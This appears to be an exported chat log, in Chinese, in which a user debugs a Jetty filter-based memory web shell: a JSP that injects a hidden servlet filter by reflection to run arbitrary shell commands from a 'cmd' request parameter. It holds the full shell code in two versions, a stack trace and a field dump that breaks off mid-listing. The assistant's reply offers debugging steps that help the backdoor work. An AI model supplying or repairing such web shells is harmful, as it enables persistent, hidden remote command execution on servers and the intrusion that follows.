# Chat

---

## 初版报错

```jsp
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                fieldFilters.setAccessible(true);
                Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                boolean flag = false;
                for(Object f:filters){
                    Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(f);
                    if(name.equals(filterName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Filter " + filterName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Filter: " + filterName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                Object filterMapping = clazz.newInstance();
                Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                method.setAccessible(true);
                method.invoke(filterMapping, holder);
                filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);

            }     
        }
    }
%>
```

访问上述 jsp 页面报错如下:

```java
HTTP ERROR 500
Problem accessing /jetty/fil.jsp. Reason:

    Server Error
Caused by:
org.apache.jasper.JasperException: An exception occurred processing JSP page /jetty/fil.jsp at line 51

48:                 Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
49:                 fieldContext.setAccessible(true);
50:                 Object webAppContext = fieldContext.get(threadClassLoader);
51:                 Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
52:                 fieldServletHandler.setAccessible(true);
53:                 Object servletHandler = fieldServletHandler.get(webAppContext);
54:                 Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");


Stacktrace:
	at org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:568)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:455)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:405)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:349)
	at org.eclipse.jetty.jsp.JettyJspServlet.service(JettyJspServlet.java:107)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)
	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:96)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:499)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:748)
Caused by: javax.servlet.ServletException: java.lang.NoSuchFieldException: _servletHandler
	at org.apache.jasper.runtime.PageContextImpl.doHandlePageException(PageContextImpl.java:905)
	at org.apache.jasper.runtime.PageContextImpl.handlePageException(PageContextImpl.java:834)
	at org.apache.jsp.jetty.fil_jsp._jspService(fil_jsp.java:181)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
	... 27 more
Caused by: java.lang.NoSuchFieldException: _servletHandler
	at java.lang.Class.getDeclaredField(Class.java:2070)
	at org.apache.jsp.jetty.fil_jsp._jspService(fil_jsp.java:117)
	... 30 more
Caused by:
javax.servlet.ServletException: java.lang.NoSuchFieldException: _servletHandler
	at org.apache.jasper.runtime.PageContextImpl.doHandlePageException(PageContextImpl.java:905)
	at org.apache.jasper.runtime.PageContextImpl.handlePageException(PageContextImpl.java:834)
	at org.apache.jsp.jetty.fil_jsp._jspService(fil_jsp.java:181)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:405)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:349)
	at org.eclipse.jetty.jsp.JettyJspServlet.service(JettyJspServlet.java:107)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)
	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:96)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:499)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.NoSuchFieldException: _servletHandler
	at java.lang.Class.getDeclaredField(Class.java:2070)
	at org.apache.jsp.jetty.fil_jsp._jspService(fil_jsp.java:117)
	... 30 more
Caused by:
java.lang.NoSuchFieldException: _servletHandler
	at java.lang.Class.getDeclaredField(Class.java:2070)
	at org.apache.jsp.jetty.fil_jsp._jspService(fil_jsp.java:117)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:405)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:349)
	at org.eclipse.jetty.jsp.JettyJspServlet.service(JettyJspServlet.java:107)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669)
	at org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter.doFilter(StrutsPrepareAndExecuteFilter.java:96)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:215)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:110)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
	at org.eclipse.jetty.server.Server.handle(Server.java:499)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
	at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
	at java.lang.Thread.run(Thread.java:748)
Powered by Jetty://
```

这是什么原因导致的?该怎么一步步来解决呢?

---

这个错误是由于在 [`webAppContext`](vscode-file://vscode-app/d:/Software/Programming/Microsoft VS Code Insiders/resources/app/out/vs/code/electron-sandbox/workbench/workbench.esm.html) 的父类中找不到 `_servletHandler` 字段导致的。要解决这个问题，可以按照以下步骤进行调试和修复：

1. **检查字段名称**：确保 `_servletHandler` 字段在 [`webAppContext`](vscode-file://vscode-app/d:/Software/Programming/Microsoft VS Code Insiders/resources/app/out/vs/code/electron-sandbox/workbench/workbench.esm.html) 的父类中确实存在。如果字段名称有误，需要找到正确的字段名称。
2. **打印调试信息**：在尝试获取字段之前，打印 [`webAppContext`](vscode-file://vscode-app/d:/Software/Programming/Microsoft VS Code Insiders/resources/app/out/vs/code/electron-sandbox/workbench/workbench.esm.html) 的类名和其父类的类名，以确保我们在正确的类中查找字段。
3. **逐步调试**：逐步调试代码，确保每一步都能正确执行，并且能够获取到正确的字段和对象。

---

## 定位类似 `servletHandler` 的字段具体在哪个类中

拉扯了几轮后最终得到了使用反射递归获取所有父类字段的 jsp:

```jsp
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println("webAppContext class: " + webAppContext.getClass().getName() + "<br>");
                out.println("webAppContext superclass: " + webAppContext.getClass().getSuperclass().getName() + "<br>");
                
                // 递归打印所有父类的字段
                Class<?> clazz = webAppContext.getClass();
                while (clazz != null) {
                    Field[] fields = clazz.getDeclaredFields();
                    for (Field field : fields) {
                        out.println("Field: " + field.getName() + " in class: " + clazz.getName() + "<br>");
                    }
                    clazz = clazz.getSuperclass();
                }
                
                // 尝试获取 _servletHandler 字段
                try {
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println("[-] Filter " + filterName + " exists.<br>");
                        return;
                    }
                    out.println("[+] Add Filter: " + filterName + "<br>");
                    out.println("[+] urlPattern: " + urlPattern + "<br>");
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }
                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                    Class  clazzFilterMapping         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazzFilterMapping.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println("Error: " + e.getMessage() + "<br>");
                }
            }     
        }
    }
%>
```

---

上述反射递归打印字段的jsp, 访问后响应如下信息:

```java
webAppContext class: org.eclipse.jetty.maven.plugin.JettyWebAppContext webAppContext superclass: org.eclipse.jetty.webapp.WebAppContext Field: LOG in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: DEFAULT_CONTAINER_INCLUDE_JAR_PATTERN in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: WEB_INF_CLASSES_PREFIX in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: WEB_INF_LIB_PREFIX in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _defaultConfigurations in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _quickStartConfigurations in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _classes in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _testClasses in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfClasses in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfJars in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfJarMap in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _classpathFiles in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _jettyEnvXml in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _overlays in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _quickStartWebXml in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _containerIncludeJarPattern in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfIncludeJarPattern in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _baseAppFirst in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _isGenerateQuickStart in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _preconfigProcessor in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: LOG in class: org.eclipse.jetty.webapp.WebAppContext Field: TEMPDIR in class: org.eclipse.jetty.webapp.WebAppContext Field: BASETEMPDIR in class: org.eclipse.jetty.webapp.WebAppContext Field: WEB_DEFAULTS_XML in class: org.eclipse.jetty.webapp.WebAppContext Field: ERROR_PAGE in class: org.eclipse.jetty.webapp.WebAppContext Field: SERVER_SYS_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: SERVER_SRV_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftProtectedTargets in class: org.eclipse.jetty.webapp.WebAppContext Field: DEFAULT_CONFIGURATION_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftSystemClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftServerClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurationClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _systemClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _serverClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurations in class: org.eclipse.jetty.webapp.WebAppContext Field: _defaultsDescriptor in class: org.eclipse.jetty.webapp.WebAppContext Field: _descriptor in class: org.eclipse.jetty.webapp.WebAppContext Field: _overrideDescriptors in class: org.eclipse.jetty.webapp.WebAppContext Field: _distributable in class: org.eclipse.jetty.webapp.WebAppContext Field: _extractWAR in class: org.eclipse.jetty.webapp.WebAppContext Field: _copyDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _copyWebInf in class: org.eclipse.jetty.webapp.WebAppContext Field: _logUrlOnStart in class: org.eclipse.jetty.webapp.WebAppContext Field: _parentLoaderPriority in class: org.eclipse.jetty.webapp.WebAppContext Field: _permissions in class: org.eclipse.jetty.webapp.WebAppContext Field: _contextWhiteList in class: org.eclipse.jetty.webapp.WebAppContext Field: _tmpDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _persistTmpDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _war in class: org.eclipse.jetty.webapp.WebAppContext Field: _extraClasspath in class: org.eclipse.jetty.webapp.WebAppContext Field: _unavailableException in class: org.eclipse.jetty.webapp.WebAppContext Field: _resourceAliases in class: org.eclipse.jetty.webapp.WebAppContext Field: _ownClassLoader in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurationDiscovered in class: org.eclipse.jetty.webapp.WebAppContext Field: _allowDuplicateFragmentNames in class: org.eclipse.jetty.webapp.WebAppContext Field: _throwUnavailableOnStartupException in class: org.eclipse.jetty.webapp.WebAppContext Field: _metadata in class: org.eclipse.jetty.webapp.WebAppContext Field: SESSIONS in class: org.eclipse.jetty.servlet.ServletContextHandler Field: SECURITY in class: org.eclipse.jetty.servlet.ServletContextHandler Field: NO_SESSIONS in class: org.eclipse.jetty.servlet.ServletContextHandler Field: NO_SECURITY in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _decorators in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _defaultSecurityHandlerClass in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _sessionHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _securityHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _servletHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _options in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _jspConfig in class: org.eclipse.jetty.servlet.ServletContextHandler Field: SERVLET_MAJOR_VERSION in class: org.eclipse.jetty.server.handler.ContextHandler Field: SERVLET_MINOR_VERSION in class: org.eclipse.jetty.server.handler.ContextHandler Field: SERVLET_LISTENER_TYPES in class: org.eclipse.jetty.server.handler.ContextHandler Field: DEFAULT_LISTENER_TYPE_INDEX in class: org.eclipse.jetty.server.handler.ContextHandler Field: EXTENDED_LISTENER_TYPE_INDEX in class: org.eclipse.jetty.server.handler.ContextHandler Field: __unimplmented in class: org.eclipse.jetty.server.handler.ContextHandler Field: LOG in class: org.eclipse.jetty.server.handler.ContextHandler Field: __context in class: org.eclipse.jetty.server.handler.ContextHandler Field: MANAGED_ATTRIBUTES in class: org.eclipse.jetty.server.handler.ContextHandler Field: _scontext in class: org.eclipse.jetty.server.handler.ContextHandler Field: _attributes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _initParams in class: org.eclipse.jetty.server.handler.ContextHandler Field: _classLoader in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextPath in class: org.eclipse.jetty.server.handler.ContextHandler Field: _displayName in class: org.eclipse.jetty.server.handler.ContextHandler Field: _baseResource in class: org.eclipse.jetty.server.handler.ContextHandler Field: _mimeTypes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _localeEncodingMap in class: org.eclipse.jetty.server.handler.ContextHandler Field: _welcomeFiles in class: org.eclipse.jetty.server.handler.ContextHandler Field: _errorHandler in class: org.eclipse.jetty.server.handler.ContextHandler Field: _vhosts in class: org.eclipse.jetty.server.handler.ContextHandler Field: _logger in class: org.eclipse.jetty.server.handler.ContextHandler Field: _allowNullPathInfo in class: org.eclipse.jetty.server.handler.ContextHandler Field: _maxFormKeys in class: org.eclipse.jetty.server.handler.ContextHandler Field: _maxFormContentSize in class: org.eclipse.jetty.server.handler.ContextHandler Field: _compactPath in class: org.eclipse.jetty.server.handler.ContextHandler Field: _eventListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _programmaticListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextAttributeListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _requestListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _requestAttributeListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _durableListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _managedAttributes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _protectedTargets in class: org.eclipse.jetty.server.handler.ContextHandler Field: _aliasChecks in class: org.eclipse.jetty.server.handler.ContextHandler Field: _availability in class: org.eclipse.jetty.server.handler.ContextHandler Field: __outerScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _outerScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _nextScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _handler in class: org.eclipse.jetty.server.handler.HandlerWrapper Field: LOG in class: org.eclipse.jetty.server.handler.AbstractHandler Field: _server in class: org.eclipse.jetty.server.handler.AbstractHandler Field: LOG in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _beans in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _listeners in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _doStarted in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: LOG in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STOPPED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: FAILED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STARTING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STARTED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STOPPING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: RUNNING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _listeners in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _lock in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __FAILED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STOPPED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STARTING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STARTED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STOPPING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _state in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _stopTimeout in class: org.eclipse.jetty.util.component.AbstractLifeCycle Error: _servletHandler webAppContext class: org.eclipse.jetty.maven.plugin.JettyWebAppContext webAppContext superclass: org.eclipse.jetty.webapp.WebAppContext Field: LOG in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: DEFAULT_CONTAINER_INCLUDE_JAR_PATTERN in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: WEB_INF_CLASSES_PREFIX in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: WEB_INF_LIB_PREFIX in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _defaultConfigurations in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _quickStartConfigurations in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _classes in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _testClasses in class: 